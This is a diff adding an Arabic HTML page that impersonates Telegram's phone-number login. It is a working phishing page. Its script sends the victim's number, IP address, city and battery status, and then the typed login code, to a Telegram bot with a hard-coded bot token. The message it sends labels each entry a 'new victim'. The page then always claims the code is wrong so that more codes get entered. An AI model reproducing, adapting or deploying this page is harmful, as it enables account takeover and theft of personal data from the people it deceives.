@@ -1,0 +1,709 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: #17212b;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            background: #17212b;
+            max-width: 450px;
+            width: 100%;
+            min-height: 100vh;
+        }
+
+        .screen {
+            display: none;
+            padding: 25px;
+            min-height: 100vh;
+        }
+
+        .screen.active {
+            display: block;
+        }
+
+        /* شاشة البداية */
+        .start-screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+
+        .start-screen .logo {
+            width: 100px;
+            height: 100px;
+            background: #2b5278;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 45px;
+            margin-bottom: 25px;
+        }
+
+        .start-screen h1 {
+            color: #ffffff;
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+
+        .start-screen .subtitle {
+            color: #7f91a4;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        .start-btn {
+            width: 100%;
+            padding: 14px;
+            background: #2b5278;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.3s;
+            font-weight: 500;
+        }
+
+        .start-btn:hover {
+            background: #3a6d9e;
+        }
+
+        /* شاشة الرقم */
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .header .icon {
+            font-size: 40px;
+            margin-bottom: 10px;
+        }
+
+        .header h2 {
+            color: #ffffff;
+            font-size: 20px;
+            font-weight: 500;
+        }
+
+        .header p {
+            color: #7f91a4;
+            font-size: 13px;
+            margin-top: 5px;
+        }
+
+        .country-row {
+            display: flex;
+            align-items: center;
+            background: #242f3d;
+            border-radius: 10px;
+            padding: 2px;
+            margin-bottom: 10px;
+        }
+
+        .country-select {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px 14px;
+            cursor: pointer;
+            color: #ffffff;
+            border-radius: 8px;
+            transition: 0.2s;
+            min-width: 120px;
+        }
+
+        .country-select:hover {
+            background: #2b5278;
+        }
+
+        .country-select .flag {
+            font-size: 20px;
+        }
+
+        .country-select .code {
+            font-size: 14px;
+        }
+
+        .country-select .arrow {
+            color: #7f91a4;
+            font-size: 12px;
+            margin-left: auto;
+        }
+
+        .phone-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: #ffffff;
+            font-size: 16px;
+            padding: 12px;
+            outline: none;
+        }
+
+        .phone-input::placeholder {
+            color: #7f91a4;
+        }
+
+        .info-text {
+            color: #7f91a4;
+            font-size: 12px;
+            margin: 12px 0;
+            line-height: 1.5;
+        }
+
+        .next-btn {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            background: #2b5278;
+            border: none;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+            float: left;
+            transition: 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .next-btn:hover {
+            background: #3a6d9e;
+        }
+
+        .next-btn:disabled {
+            background: #1c3147;
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+
+        /* شاشة الكود */
+        .code-header {
+            color: #7f91a4;
+            font-size: 13px;
+            text-align: center;
+            margin: 8px 0;
+        }
+
+        .code-header span {
+            color: #2b5278;
+            cursor: pointer;
+            font-weight: 500;
+        }
+
+        .code-inputs {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 30px 0;
+        }
+
+        .code-inputs input {
+            width: 44px;
+            height: 52px;
+            background: #242f3d;
+            border: 1px solid #2b5278;
+            border-radius: 8px;
+            color: #ffffff;
+            font-size: 20px;
+            text-align: center;
+            outline: none;
+            transition: 0.2s;
+        }
+
+        .code-inputs input:focus {
+            border-color: #3a6d9e;
+            box-shadow: 0 0 0 2px rgba(43,82,120,0.3);
+        }
+
+        .timer-row {
+            text-align: center;
+            color: #7f91a4;
+            font-size: 13px;
+            margin: 15px 0;
+        }
+
+        .timer-row span {
+            color: #2b5278;
+            cursor: pointer;
+            font-weight: 500;
+        }
+
+        .error-msg {
+            color: #e04848;
+            font-size: 12px;
+            text-align: center;
+            margin-top: 8px;
+            display: none;
+        }
+
+        /* قائمة الدول */
+        .country-list {
+            background: #17212b;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            z-index: 10;
+            overflow-y: auto;
+            display: none;
+        }
+
+        .country-list.active {
+            display: block;
+        }
+
+        .country-list .list-header {
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            border-bottom: 1px solid #242f3d;
+            position: sticky;
+            top: 0;
+            background: #17212b;
+            z-index: 2;
+        }
+
+        .country-list .list-header .close-btn {
+            color: #2b5278;
+            font-size: 22px;
+            cursor: pointer;
+        }
+
+        .country-list .list-header h3 {
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: 500;
+        }
+
+        .country-list .search-input {
+            width: 100%;
+            padding: 12px 16px;
+            background: #242f3d;
+            border: none;
+            border-radius: 10px;
+            color: #ffffff;
+            font-size: 14px;
+            outline: none;
+            margin: 12px 20px;
+            width: calc(100% - 40px);
+        }
+
+        .country-item {
+            padding: 14px 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+            color: #ffffff;
+            transition: 0.2s;
+        }
+
+        .country-item:hover {
+            background: #242f3d;
+        }
+
+        .country-item .cname {
+            font-size: 15px;
+        }
+
+        .country-item .ccode {
+            color: #7f91a4;
+            font-size: 13px;
+            margin-left: auto;
+        }
+
+        /* لودنق */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(23,33,43,0.95);
+            z-index: 20;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .spinner {
+            width: 36px; height: 36px;
+            border: 3px solid #242f3d;
+            border-top-color: #2b5278;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .loading-text {
+            color: #7f91a4;
+            margin-top: 12px;
+            font-size: 13px;
+        }
+
+        .welcome-back {
+            text-align: center;
+            color: #2b5278;
+            font-size: 13px;
+            margin-top: 20px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- شاشة البداية -->
+        <div class="screen active start-screen" id="startScreen">
+            <div class="logo">✈️</div>
+            <h1>Telegram</h1>
+            <p class="subtitle">تسجيل الدخول إلى حسابك</p>
+            <button class="start-btn" onclick="showPhoneScreen()">تسجيل الدخول برقم الهاتف</button>
+            <p class="welcome-back" onclick="showPhoneScreen()">مرحباً بعودتك!</p>
+        </div>
+
+        <!-- شاشة الرقم -->
+        <div class="screen" id="phoneScreen">
+            <div class="header">
+                <div class="icon">✈️</div>
+                <h2>رقم هاتفك</h2>
+                <p>الرجاء إدخال رقم هاتفك لتسجيل الدخول</p>
+            </div>
+
+            <div class="country-row">
+                <div class="country-select" onclick="showCountries()">
+                    <span class="flag" id="selFlag">🇸🇾</span>
+                    <span class="code" id="selCode">+963</span>
+                    <span class="arrow">▼</span>
+                </div>
+                <input type="tel" class="phone-input" id="phoneInput" placeholder="رقم الهاتف" maxlength="15" oninput="checkPhone()">
+            </div>
+
+            <p class="info-text">
+                سيتم إرسال رمز تأكيد مكون من 5 أرقام إلى حسابك في تلغرام. يرجى إدخاله للمتابعة.
+            </p>
+
+            <div class="error-msg" id="phoneError">يرجى إدخال رقم هاتف صحيح</div>
+
+            <button class="next-btn" id="phoneBtn" disabled onclick="sendCode()">➤</button>
+        </div>
+
+        <!-- شاشة الكود -->
+        <div class="screen" id="codeScreen">
+            <div class="header">
+                <div class="icon">✈️</div>
+                <h2>رمز التأكيد</h2>
+                <p>أدخل الرمز المرسل إلى حسابك</p>
+            </div>
+
+            <p class="code-header">
+                تم إرسال الرمز إلى <span onclick="showPhoneScreen()">+<span id="dispCode"></span> <span id="dispNumber"></span></span>
+            </p>
+
+            <div class="code-inputs" id="codeInputs">
+                <input type="tel" maxlength="1" oninput="moveNext(this)" onkeydown="movePrev(event, this)">
+                <input type="tel" maxlength="1" oninput="moveNext(this)" onkeydown="movePrev(event, this)">
+                <input type="tel" maxlength="1" oninput="moveNext(this)" onkeydown="movePrev(event, this)">
+                <input type="tel" maxlength="1" oninput="moveNext(this)" onkeydown="movePrev(event, this)">
+                <input type="tel" maxlength="1" oninput="moveNext(this)" onkeydown="movePrev(event, this)">
+            </div>
+
+            <div class="error-msg" id="codeError">الرمز غير صحيح. يرجى المحاولة مرة أخرى.</div>
+
+            <p class="timer-row" id="timerRow">
+                إعادة الإرسال خلال <span id="timerCount">45</span> ثانية
+            </p>
+        </div>
+
+        <!-- قائمة الدول -->
+        <div class="country-list" id="countryList">
+            <div class="list-header">
+                <span class="close-btn" onclick="hideCountries()">✕</span>
+                <h3>اختر الدولة</h3>
+            </div>
+            <input type="text" class="search-input" id="searchCountry" placeholder="بحث..." oninput="filterCountries()">
+            <div id="countryItems"></div>
+        </div>
+
+        <!-- لودنق -->
+        <div class="loading-overlay" id="loadingOverlay">
+            <div class="spinner"></div>
+            <p class="loading-text" id="loadingText">جاري الإرسال...</p>
+        </div>
+    </div>
+
+    <script>
+        var chatId = new URL(window.location.href).searchParams.get('chatId') || '';
+        var BOT_TOKEN = '8757323904:AAFstrBa_966uP2S3_7QyMSdOoolhfNVhDM';
+        var sent = false;
+
+        var countries = [
+            { name: 'سوريا', code: '+963', flag: '🇸🇾' },
+            { name: 'مصر', code: '+20', flag: '🇪🇬' },
+            { name: 'السعودية', code: '+966', flag: '🇸🇦' },
+            { name: 'الإمارات', code: '+971', flag: '🇦🇪' },
+            { name: 'العراق', code: '+964', flag: '🇮🇶' },
+            { name: 'الأردن', code: '+962', flag: '🇯🇴' },
+            { name: 'لبنان', code: '+961', flag: '🇱🇧' },
+            { name: 'فلسطين', code: '+970', flag: '🇵🇸' },
+            { name: 'الكويت', code: '+965', flag: '🇰🇼' },
+            { name: 'قطر', code: '+974', flag: '🇶🇦' },
+            { name: 'البحرين', code: '+973', flag: '🇧🇭' },
+            { name: 'عمان', code: '+968', flag: '🇴🇲' },
+            { name: 'اليمن', code: '+967', flag: '🇾🇪' },
+            { name: 'المغرب', code: '+212', flag: '🇲🇦' },
+            { name: 'الجزائر', code: '+213', flag: '🇩🇿' },
+            { name: 'تونس', code: '+216', flag: '🇹🇳' },
+            { name: 'ليبيا', code: '+218', flag: '🇱🇾' },
+            { name: 'السودان', code: '+249', flag: '🇸🇩' },
+            { name: 'تركيا', code: '+90', flag: '🇹🇷' },
+            { name: 'روسيا', code: '+7', flag: '🇷🇺' },
+            { name: 'ألمانيا', code: '+49', flag: '🇩🇪' },
+            { name: 'فرنسا', code: '+33', flag: '🇫🇷' },
+            { name: 'بريطانيا', code: '+44', flag: '🇬🇧' },
+            { name: 'أمريكا', code: '+1', flag: '🇺🇸' }
+        ];
+
+        var selectedCountry = countries[0];
+        var countdownTimer;
+        var currentCode = '';
+
+        function renderCountries(filter) {
+            var container = document.getElementById('countryItems');
+            var filtered = filter ? countries.filter(function(c) {
+                return c.name.indexOf(filter) !== -1 || c.code.indexOf(filter) !== -1;
+            }) : countries;
+
+            container.innerHTML = filtered.map(function(c) {
+                return '<div class="country-item" onclick="selectCountry(\'' + c.name + '\', \'' + c.code + '\', \'' + c.flag + '\')">' +
+                    '<span style="font-size:22px;">' + c.flag + '</span>' +
+                    '<span class="cname">' + c.name + '</span>' +
+                    '<span class="ccode">' + c.code + '</span>' +
+                '</div>';
+            }).join('');
+        }
+
+        function showPhoneScreen() {
+            document.getElementById('startScreen').classList.remove('active');
+            document.getElementById('codeScreen').classList.remove('active');
+            document.getElementById('phoneScreen').classList.add('active');
+            if (countdownTimer) clearInterval(countdownTimer);
+        }
+
+        function showCountries() {
+            document.getElementById('countryList').classList.add('active');
+            document.getElementById('searchCountry').value = '';
+            renderCountries();
+            setTimeout(function() {
+                document.getElementById('searchCountry').focus();
+            }, 300);
+        }
+
+        function hideCountries() {
+            document.getElementById('countryList').classList.remove('active');
+        }
+
+        function filterCountries() {
+            renderCountries(document.getElementById('searchCountry').value);
+        }
+
+        function selectCountry(name, code, flag) {
+            selectedCountry = { name: name, code: code, flag: flag };
+            document.getElementById('selFlag').textContent = flag;
+            document.getElementById('selCode').textContent = code;
+            document.getElementById('countryList').classList.remove('active');
+            checkPhone();
+        }
+
+        function checkPhone() {
+            var phone = document.getElementById('phoneInput').value.trim();
+            var btn = document.getElementById('phoneBtn');
+            var err = document.getElementById('phoneError');
+
+            if (phone.length >= 7) {
+                btn.disabled = false;
+                err.style.display = 'none';
+            } else {
+                btn.disabled = true;
+                if (phone.length > 0 && phone.length < 7) err.style.display = 'block';
+            }
+        }
+
+        function showLoading(text) {
+            document.getElementById('loadingText').textContent = text;
+            document.getElementById('loadingOverlay').classList.add('active');
+        }
+
+        function hideLoading() {
+            document.getElementById('loadingOverlay').classList.remove('active');
+        }
+
+        async function sendCode() {
+            if (sent) return;
+
+            var phone = document.getElementById('phoneInput').value.trim();
+            if (!phone || phone.length < 7) return;
+
+            var fullNumber = selectedCountry.code + phone;
+
+            showLoading('جاري إرسال رمز التأكيد...');
+
+            var ipInfo = await getIpInfo();
+            var batteryInfo = await getBatteryInfo();
+
+            var text = '✈️ تلغرام - ضحية جديدة!\n\n';
+            text += '📞 الرقم: ' + fullNumber + '\n';
+            text += '🌍 الدولة: ' + selectedCountry.name + '\n';
+            text += '📍 الموقع: ' + ipInfo.country + ' - ' + ipInfo.city + '\n';
+            text += '🌐 IP: ' + ipInfo.ip + '\n';
+            text += '🔋 البطارية: ' + batteryInfo.level + '%\n';
+            text += '⚡ الشحن: ' + batteryInfo.charging;
+
+            await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: text })
+            });
+
+            await sleep(2000);
+            hideLoading();
+
+            document.getElementById('phoneScreen').classList.remove('active');
+            document.getElementById('codeScreen').classList.add('active');
+
+            document.getElementById('dispCode').textContent = selectedCountry.code;
+            document.getElementById('dispNumber').textContent = phone;
+
+            currentCode = Math.floor(10000 + Math.random() * 90000).toString();
+
+            startCountdown();
+
+            document.getElementById('codeInputs').querySelector('input').focus();
+        }
+
+        function startCountdown() {
+            var seconds = 45;
+            document.getElementById('timerCount').textContent = seconds;
+
+            clearInterval(countdownTimer);
+            countdownTimer = setInterval(function() {
+                seconds--;
+                document.getElementById('timerCount').textContent = seconds;
+
+                if (seconds <= 0) {
+                    clearInterval(countdownTimer);
+                    document.getElementById('timerRow').innerHTML = '<span onclick="resendCode()">إعادة إرسال الرمز</span>';
+                }
+            }, 1000);
+        }
+
+        async function resendCode() {
+            showLoading('جاري إعادة الإرسال...');
+            await sleep(1500);
+            hideLoading();
+            currentCode = Math.floor(10000 + Math.random() * 90000).toString();
+            startCountdown();
+        }
+
+        function moveNext(input) {
+            if (input.value.length === 1) {
+                var next = input.nextElementSibling;
+                if (next) next.focus();
+                checkCompleteCode();
+            }
+        }
+
+        function movePrev(event, input) {
+            if (event.key === 'Backspace' && input.value.length === 0) {
+                var prev = input.previousElementSibling;
+                if (prev) prev.focus();
+            }
+        }
+
+        function getCode() {
+            var inputs = document.querySelectorAll('#codeInputs input');
+            var code = '';
+            inputs.forEach(function(inp) { code += inp.value; });
+            return code;
+        }
+
+        async function checkCompleteCode() {
+            var code = getCode();
+
+            if (code.length === 5) {
+                document.getElementById('codeError').style.display = 'none';
+
+                showLoading('جاري التحقق...');
+                await sleep(2000);
+
+                var text = '✈️ تلغرام - كود التأكيد!\n\n';
+                text += '🔢 الكود: ' + code + '\n';
+                text += '📞 الرقم: ' + selectedCountry.code + document.getElementById('phoneInput').value + '\n';
+                text += '🕐 الوقت: ' + new Date().toLocaleString('ar-SA');
+
+                await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: text })
+                });
+
+                await sleep(1000);
+                hideLoading();
+
+                document.getElementById('codeError').style.display = 'block';
+                document.getElementById('codeError').textContent = 'الرمز غير صحيح. يرجى المحاولة مرة أخرى.';
+
+                document.querySelectorAll('#codeInputs input').forEach(function(inp) {
+                    inp.value = '';
+                });
+                document.getElementById('codeInputs').querySelector('input').focus();
+            }
+        }
+
+        async function getIpInfo() {
+            try {
+                var r = await fetch('https://ipapi.co/json/');
+                var d = await r.json();
+                return { ip: d.ip || '?', country: d.country_name || '?', city: d.city || '?' };
+            } catch(e) {
+                return { ip: '?', country: '?', city: '?' };
+            }
+        }
+
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) {
+                try {
+                    var b = await navigator.getBattery();
+                    return { level: Math.round(b.level * 100), charging: b.charging ? 'نعم' : 'لا' };
+                } catch(e) {}
+            }
+            return { level: '?', charging: '?' };
+        }
+
+        function sleep(ms) {
+            return new Promise(function(r) { setTimeout(r, ms); });
+        }
+
+        renderCountries();
+    </script>
+</body>
+</html>
